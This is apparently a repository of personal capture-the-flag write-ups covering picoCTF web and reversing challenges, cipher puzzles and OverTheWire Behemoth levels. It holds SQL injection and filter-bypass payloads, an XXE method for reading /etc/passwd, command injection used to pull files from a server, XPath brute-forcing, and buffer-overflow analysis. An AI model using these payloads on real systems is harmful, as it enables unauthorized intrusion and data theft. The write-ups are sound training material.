3. For each column, look for the index that matches the expected value of the static PNG header.
4. Generate the key and decrypt the PNG image.
5. Use `zbarimg` to find the QR code embedded in the PNG image.




### File: writeups/picoctf/028-javascript kiddie 2/README.md


# JavaScript Kiddie 2

Byte-Shift-Based Encryption


# Problem

As in `JavaScript Kiddie 1`, the `bytes` file contains all shifted
bytes that represent a PNG image. Again, the PNG header is fixed
and the first 16 bytes are static, and contain the PNG header followed
by the `IDHR` header.


As the `bytes` file this time contains multiple possible offsets
that could lead to potential solutions, the challenge here is more
complex in the sense that there are multiple permutations of those
offsets possible.


# Solution

Instead of manually typing in all 45 possible permutations, I decided
to write a `cracker.mjs` that does this automatically by using
`zbarimg` to detect whether or not the generated PNG images contain
a valid QR code.

1. Convert the bytes into a Buffer.
2. Split the buffer into 16 columns (possible "arm bandit rows").
3. For each column, look for possible matching indexes that match the expected value of the static PNG header.
4. For each possible index, generate permutations of input keys.
5. Use all possible permutations in a loop and generate a decrypted PNG image.
6. Use `zbarimg` to find a potential QR code embedded in the PNG image.




### File: writeups/picoctf/029-irish-name-repo/README.md


# Irish Name Repo 1

SQL Injection Attack


# Problem

On the server-side, there's probably a PHP script running which
builds an SQL query.

The `support.html` file hints to an SQL problem when using the
name `Brian O' Connor`, which means that the server-side script
probably looks similar to this:

```php
$username = $_POST['username'];
$password = $_POST['password'];
$result   = mysql_query("SELECT whatever FROM admin WHERE username = '$username' and password = '$password'");

if ($result) {
	// ...
}
```

The above script, however, doesn't sanitize malicious input which
means that the `login.php` script is vulnerable to an SQL injection.

In the username, we can enter `admin`.
In the password, we can enter `' OR '1'='1';`.

Et voila, admin access.


# Solution

- Always sanitize your inputs
- Always remove special characters if necessary
- Use static query templates, in PHP via `$connection->prepare(...)` and using `?` as placeholders, which can be bound later via `bind_param(type, value)`.




### File: writeups/picoctf/030-some assembly required 2/README.md


# Some Assembly Required 2

WebAssembly Reverse Engineering


# Problem

On the client-side, there's a code running that was compiled
and obfuscated into WebAssembly. The `index.html` uses this
code and calls it. However, WebAssembly is hard to read and
the challenge is to reverse engineer the `copy_char` and `strcmp`
methods in the WebAssembly file.


# Solution

- Install `binaryen` on your machine.
- Use `wasm2js` to decompile the WebAssembly file into `JavaScript` again.

The WebAssembly code exports three methods (`$1`, `$2` and `$3`), and includes
a statically embedded `base64` string, which is masked. The demasking function
is `$2`, which uses a `byte ^ 8` mask. Luckily, `XOR`s inverse function is `XOR`.

I implemented the `decoder.js` file which shows how to do that in `node.js`, and
which returns the decoded flag.




### File: writeups/picoctf/031-some assembly required 3/README.md


# Some Assembly Required 2

WebAssembly Reverse Engineering


# Problem

On the client-side, there's a code running that was compiled
and obfuscated into WebAssembly. The `index.html` uses this
code and calls it. However, WebAssembly is hard to read and
the challenge is to reverse engineer the `copy_char` and `strcmp`
methods in the WebAssembly file.


# Solution

- Install `binaryen` on your machine.
- Use `wasm2js` to decompile the WebAssembly file into `JavaScript` again.

The WebAssembly code exports three methods (`$1`, `$2` and `$3`), and includes
two statically embedded `base64` strings, where one is the masked string and
the other one is the mask itself.

This time, the mask is computed in a more complicated manner, and the challenge
is to follow through the code and understand what it's doing.

The `WebAssembly` memory contains at offset `1024` the masked string, and at offset
`1067` the mask for decoding it. The `copy` function in the decompiled `.dcmp` file
contains the algorithm that is used to decode the masked string.

I implemented the `decoder.js` file which shows how to do that in `node.js`, and
which returns the decoded flag.




### File: writeups/picoctf/032-local authority/README.md


# Local Authority

Never use Browser-side password validation


# Problem

The browser-side `secure.js` validates the password in a static
manner, and uses plaintext comparisons in order to figure out
the user privileges.


# Solution

Read the code, and find out the `admin` user's password.




### File: writeups/picoctf/033-search source/README.md


# Search Source

Never hide secrets in the client-side code.


# Problem

The challenge is quite easy, you need to scrape the
website and its assets; and then simply grep for the
flag inside the folder(s).

# Solution

```bash
wget --convert-links --page-requisistes --html-extension --span-hosts -e robots=off "http://linktochallenge";
grep -R "picoCTF{" ./
```



### File: writeups/picoctf/034-soap/README.md


# SOAP

Never use a standard XML serializer that supports external entity resources.


# Problem

The server-side implementation uses a standard XML serializer which supports
the references of external `<!ENTITY ...>` resources, and which can be
referenced in the request template for the returned response.

At first I thought the descriptions looked way too similar to the `/etc/passwd`
file format (with all the `:::::` in the description strings), which is why
I assumed that the `/data` API returns the description of a specific user or
group via their UIDs/GIDs. I let this code stay in the `bruteforce.mjs` file
for reference.

The second attack I had in mind was that I know XML parsers have huge security
issues when they're used in a simple manner on the server-side, and without
explicit feature deactivations of external entity resources. There's even an
OWASP article about [XML External Entity Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_\(XXE\)_Processing)
in case you're curious about it.


# Solution

1. The API accepts XML payloads requests and returns the content of `<data><ID>...</ID></data>`
2. Create an `<!ENTITY ...>` with a specific name, and reference it in the request payload.
3. Et voila, you have the `/etc/passwd` file contents.




### File: writeups/picoctf/035-most cookies/README.md


# Most Cookies

Flask App Secrets should be completely randomized


# Problem

The server-side implementation uses a dictionary to choose
the Flask App Secret upon running the `server.py` file.

So this is basically a dictionary attack, as the amount of
encryption keys is not really random; and the salt for the
generation of the hashes is also static and `cookie-session`
by default.


# Solution

1. Open up the Browser to the CTF index page.
2. Copy the `session` Cookie from the DevTools (Network Tab/Response).
3. Run the `python crack.py <session_cookie>` command, which will do the dictionary attack and then send the spoofed cookie to the `/display` route to get the flag.




### File: writeups/picoctf/037-cowsay as a service/README.md


# Cowsay As a Service

Never use unsanitized strings as a command line argument


# Problem

The `cowsay ${message}` command is invoked on the server,
and the contents of that shell command are returned as a
response.


# Solution

Our task is to invoke the `ls` command to get an overview
of the folder structure, and then to use the `cat` command
in order to download the necessary files.

The `scrape.mjs` implements a simple approach that automatically
downloads all files it finds on the server.


# Further Notes

There's probably a way to invoke shellshock, too.




### File: writeups/picoctf/038-web gauntlet/README.md


# Web Gauntlet

SQL injections and variants.


# Problem

The challenge is to bypass the filters in order to get a successful login via the SQL queries.
Each time you're successful, the SQL query is printed out.

The password for each round doesn't matter, you can always enter `whatever`.

# Solution

## Round 1:

Username: `admin' /*` or `admin; --`

## Round 2:

Username: `admin' /*`

## Round 3:

Username: `admin';`

## Round 4 (alternative)

I think the challenge was designed so that it should use a `UNION` statement, and refers to the
fact that the username `admin` might be the first user in the table `users`.

Username: `whatever'/**/UNION/**/SELECT/**/*/**/FROM/**/users/**/LIMIT/**/1;`

This will execute actually two different SQL queries, where all occurances of `/**/` will be converted
to a space character.

- First query is `SELECT * FROM users WHERE username='whatever'`
- Second query is `SELECT/**/*/**/FROM/**/users/**/LIMIT/**/1;`

## Round 4 and 5:

This one is much tougher and took me a while. Behind the scenes, `admin` as a username isn't allowed
so the resulting SQL query should concat the values together. You can probably also use `a'||'dmin'`
or similar variants alternatively.

Username: `ad'||'min';`




### File: writeups/picoctf/039-x marks the spot/README.md


# X Marks The Spot

XML XPath Injection and vulnerabilities.


# Problem

The challenge is to bypass and abuse the XSLT processor on the backend in order to
gather intelligence about the users, the password lengths, and then about the passwords
themselves.

Additionally the login form and responses are so crappy that the "not true" conditions
are a little hacky, so you have to write conditions that allow to reason in case the
login failed (e.g. using `>` and `<` instead of `>=` or `<=` for comparison).


## Data Structure

Due to how the API is being called, and by what was found out during tryouts of multiple
XPath queries, we assume that the XML data structure on the server-side looks something
like this:

```xml
<users>
    <user id="1"> <!-- example user id -->
        <name>... username</name>
        <pass>... password</pass>
    </user>
</users>
```

This implies that we can craft multiple XPath queries that abuse the data structures,
and use things like `string-length()`, `text()` and others for the queries; because
they are being processed by the XPath query selector on the server-side.

In order to do so, it is generally recommended to use the first text input field for
this; in order to have a better validation. As generally most database queries are
selecting the username first; and then matching it against the password, it's more
likely to succeed when using the injection strings in the username text field.


# Solution

## Round 1: Find out usernames (user ids) with short passwords

We can craft an XPath injection that returns a success/failure response when we use a
query that compares the password length. If the password length is longer than the query
compares against, we get a response of failure.

Initially I tried out the length of `30` for the sake of tryout, and in the resulting
`password-lengths.json` there were two user ids missing, which implied that they had a longer password.
When trying it out with a maximum length of `64`, all user ids appeared and they were
appearing in the resulting `password-lengths.json` database.

```bash
node bruteforce-password-lengths.mjs;

# users with password length==0 are likely to not exist
vim password-lengths.json;
```


## Round 2: Bruteforce usernames

In Round 1 we found out that there are 3 possibly valid user ids, each with their own
password length represented in the `password-lengths.json`.

Now it's time to found out the usernames. We craft an XPath injection that compares the
text value of the `<name>` element in the XML with the bruteforced username(s).

```bash
node bruteforce-usernames.mjs;
vim usernames.json;
```


## Round 3: Find the Flag

One of the users must be the flag. By obversing the results in Round 2, we can assume
that the user with the longest password (`length` being `50` characters) is likely to
be the flag.

We can verify this by crafting an XPath query that compares the `<pass>` element's `text()`
with the prefix `picoCTF{`.

```bash
node find-flag.mjs;
# user with id=3 has a password that starts with picoCTF{...
```


## Round 4: Bruteforce passwords

The job would now be to bruteforce only the password of the user with id `3`. But because
we know what to do, we can just generally start to bruteforce the passwords for all users.

```bash
node bruteforce-passwords.mjs;
vim passwords.json;
```



### File: writeups/picoctf/040-web gauntlet 2/README.md


# Web Gauntlet 2

SQL injection.


# Problem

The challenge is to bypass the filters in order to get a successful login via the SQL queries.
Each time you're successful, the SQL query is printed out.

The password for each round doesn't matter, you can always enter `whatever`.

# Solution

## Round 1:

Username: `adm'||'in`
Password: `a' IS NOT 'b`




### File: writeups/picoctf/041-web gauntlet 3/README.md


# Web Gauntlet 3

SQL injection and conditions.


# Problem

The challenge is to bypass the filters and to create a condition on the server-side
which evaluates to `true`.


# Solution

## Step 1: Find out the SQL query

Username: `adm'||'in`
Password: `whatever`

This printed out the SQL query that's being used on the server side for the login:

```sql
SELECT username, password FROM users WHERE username='adm'||'in' AND password='whatever'
```

## Step 2: Modifying the AND condition

The filter blocks out pretty much everything in regards to `OR`, `AND`, `true` and `false`,
so the real challenge behind this CTF was to find a way to make the condition evaluate to
`true`, so that the query succeeds.

```sql
-- Simplified query
SELECT username, password FROM users WHERE () AND (/*...needs to be true...*/)
```

In order to make the condition evaluate to `true`, we tried out a couple of variations for
the `password` input field, where `a' IS NOT 'b` eventually succeeded. Probably `a' IS 'a`
or other variations would succeed, too.

As the combined input had to be maximum `25` characters, the amount of solutions was quite
limited.

Username: `ad'||'min`
Password: `a' IS NOT 'b`




### File: writeups/picoctf/README.md


# Write-Ups for picoCTF Challenges

This folder contains my write-ups and notes for the picoCTF
challenges.

The `challenge` folder always contains a `download.sh` that
gets the source codes for local debugging and analysis.

In the `solution` folder there's usually the source codes
that try to automate the decoding/reverse engineering process,
with all shell scripts and commands that were used in the
process.


## Unsolved Challenges

- [Super Serial](./036-super serial): Currently no idea how to start.




### File: writeups/veloren-scavenger-hunt/02-mindflayer/README.md


# Part 2: Mindflayer Rhyme

Vigenere Cipher / ROT

Encrypted Text: uutxw oor gfy aydxs a qprep pduttyps xwjhwo cytzfiyb hlpgxrxi yrbprq pfimex hlpgxrxz

Password: mindflayer

Decrypted Text: imgur dot com slash a slash capitalb lowerd capitaly capitala lowers loweru capitalr


# Solution

URL to next Part: https://imgur.com/a/BdYAsur




### File: writeups/veloren-scavenger-hunt/03-knights-path/README.md


# Part 3: Knight's Path

The knight's path puzzle was a little trickster puzzle, because I initially thought it would use
vigenere with excluded . and / characters for a URL due to the alphabet needing custom characters
then.

But as it turns out, it was quite easy. It was helpful to mark the paths to find out that the Knight
didn't start at `K` but at `P` (the only field where a Knight in Chess usually stands initially).

That lead to recognizing `pastebin` and the `pastebin / Asu0Kyth` strings.


# Solution

The URL to the next part is: https://pastebin.com/Asu0Kyth




### File: writeups/veloren-scavenger-hunt/04-hiding-the-truth/README.md


# Part 04: Hiding the Truth

First letters of the text are:

Https Medium Iteribi Dot Github dot io


# Solution:

The URL to the next puzzle is: https://mediumiteribi.github.io




### File: writeups/veloren-scavenger-hunt/05-veloren-security-agency/README.md


# Veloren Security Agency

The password from the `admin@vsa.gov` was temporarily set to `NORWAYBEST!!` which can be
used to access the classified messages.


KOZGRKZX KOZGRKZX N OOZGRKZX POZGRKZX
UOZGRKZX Q IFTNR : MLRGZXLO KFGVVN VSG HR
VIVS , KFGVVN VSG ILU MLRGZXKLO VIFXVH VILN
Z LG VELN VD VHREWZ R , FLB TMRWMVH MVVY
VE'R HVTZHHVN VSG WZVI LG TMRBIG BOYZYLIK
VIZ HBFT ZHE VHLSG


# Solution

Affine Cipher, A=25, B=25

THOSE VSA GUYS ARE PROBABLY TRYING TO READ THE MESSAGES I'VE BEEN SENDING YOU , I ADVISE WE MOVE TO A MORE SECURE LOPCATION FOR THE MEETUP , HERE IS THE MEETUP LOCATION : IMGUR J CAPITALF CAPITALK CAPITALL M CAPITALP CAPITALP

https://imgur.com/jFKLmPP




### File: writeups/veloren-scavenger-hunt/06-templo-cristi/README.md


# Part 6: Absconditus

The second part of the puzzle contained "Absconditus" as its `<title>` of the HTML file
and the initial letters on the cover page were the translation for that.


# Solution

The ciphertext on top is a hint to the London Computing website about a fictional templar cipher,
which uses the the key that's available here:

https://teachinglondoncomputing.org/code-cracking-puzzles/the-templar-cipher/the-key-to-the-templars-cipher/

Translated message:

```
PASTEBIN
CAPITAL T
THREE
CAPITAL X
CAPITAL X
LOWER Z
LOWER Q
CAPITAL R
CAPITAL X
```

The URL for the next part of the puzzle is: https://pastebin.com/T3XXzqRX

# Password for Pastebin

The bottom ciphertext uses Futhark Antiguo:

[Futhark Antiguo on wikipedia](https://es.wikipedia.org/wiki/Futhark_antiguo)

```
ENLIGHTENMENT
```



### File: writeups/veloren-scavenger-hunt/07-the-path-narrows/README.md


# Part 7 - The Path Narrows

The YouTube Video from the Pastebin:

https://youtube.com/watch?v=KApjJsNYUSw


**Title**:

`6f766572666c6f77`

The Hash leads to an album called "Overflow" on Google.

**Description**:

`01010100 01101000 01100101 00100000 01110000 01100001 01110100 01101000 00100000 01101110 01100001 01110010 01110010 01101111 01110111 01110011`

Translated Description: "The path narrows".

**Video Content**:

There's an alchemist babbling in mathematical formulas that seemingly don't make sense.
But it seems as those equation results are either the result of a wrong `base` or wrong `bit length`
that was being used, and the carry bit might be overflowing.

```
48 - 7  = 146
4  + 8  = 131
14 + 5  = 122
4  + 15 = 136
2  x 2  = 118
10 x 9  = 171
13 + 4  = 85
8  + 14 = 77
54 - 14 = 116
7  x 6  = 150
```



### File: writeups/golang/webview-test/NOTES.md


- Linked (.so) compilation works fine, but requires a shit ton of libraries.
- Static compilation is a major headache, because the following libraries are not available on Arch as a `.a` file:

```bash
/usr/lib/go/pkg/tool/linux_amd64/link: running g++ failed: exit status 1
/sbin/ld: cannot find -lwebkit2gtk-4.0: No such file or directory
/sbin/ld: cannot find -lgtk-3: No such file or directory
/sbin/ld: cannot find -lgdk-3: No such file or directory
/sbin/ld: cannot find -lpangocairo-1.0: No such file or directory
/sbin/ld: cannot find -lpango-1.0: No such file or directory
/sbin/ld: cannot find -lharfbuzz: No such file or directory
/sbin/ld: cannot find -latk-1.0: No such file or directory
/sbin/ld: cannot find -lcairo-gobject: No such file or directory
/sbin/ld: cannot find -lcairo: No such file or directory
/sbin/ld: cannot find -lgdk_pixbuf-2.0: No such file or directory
/sbin/ld: cannot find -lsoup-2.4: No such file or directory
/sbin/ld: cannot find -ljavascriptcoregtk-4.0: No such file or directory
collect2: error: ld returned 1 exit status
```




### File: writeups/overthewire-behemoth/solutions/behemoth0.md


# behemoth0

- Username: `behemoth0`
- Password: `behemoth0`


# Solution

If you use `ltrace` to find out what methods are being called, you can observe
that the entered password is compared to `eatmyshorts`, which is stored as a
char encoded array in the memory as `OK^GSYBEX^Y`.

```bash
cd /behemoth;
ltrace ./behemoth0; # Enter "whatever"
```

```bash
__libc_start_main(0x804921d, 1, 0xffffd694, 0 <unfinished ...>
printf("Password: ")                                             = 10
__isoc99_scanf(0x804a054, 0xffffd58f, 0x804a008, 0x804a020Password: whatever
)      = 1
strlen("OK^GSYBEX^Y")                                            = 11
strcmp("whatever", "eatmyshorts")                                = 1
puts("Access denied.."Access denied..
)                                          = 16
+++ exited (status 0) +++
```

```bash
./behemoth0; # Enter "eatmyshorts"
behemoth0@gibson:/behemoth$ ./behemoth0
Password: eatmyshorts
Access granted..
$ cat /etc/behemoth_pass/behemoth1
8JHFW9vGru
```



### File: writeups/overthewire-behemoth/solutions/behemoth1.md


# behemoth1

- Username: `behemoth1`
- Password: `8JHFW9vGru`


# Solution

The binary is prone to a buffer overflow, because it uses `gets()` to fill the buffer without a limit.
Inside the binary, `0x44` bytes have been allocated, which means we need at least `68 bytes` of input
before the buffer overflows. Afterwards, we need to get at the `EIP` which is at offset (TODO).


```bash
cd /behemoth;

behemoth1@gibson:/behemoth$ gdb -q ./behemoth1
Reading symbols from ./behemoth1...
(No debugging symbols found in ./behemoth1)
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
   0x08049196 <+0>:	push   ebp
   0x08049197 <+1>:	mov    ebp,esp
   0x08049199 <+3>:	sub    esp,0x44 # 68 Bytes allocated for buffer
   0x0804919c <+6>:	push   0x804a008
   0x080491a1 <+11>:	call   0x8049050 <printf@plt>
   0x080491a6 <+16>:	add    esp,0x4
   0x080491a9 <+19>:	lea    eax,[ebp-0x43]
   0x080491ac <+22>:	push   eax
   0x080491ad <+23>:	call   0x8049060 <gets@plt>
   0x080491b2 <+28>:	add    esp,0x4
   0x080491b5 <+31>:	push   0x804a014
   0x080491ba <+36>:	call   0x8049070 <puts@plt>
   0x080491bf <+41>:	add    esp,0x4
   0x080491c2 <+44>:	mov    eax,0x0
   0x080491c7 <+49>:	leave  
   0x080491c8 <+50>:	ret                               # return EIP
End of assembler dump.
```


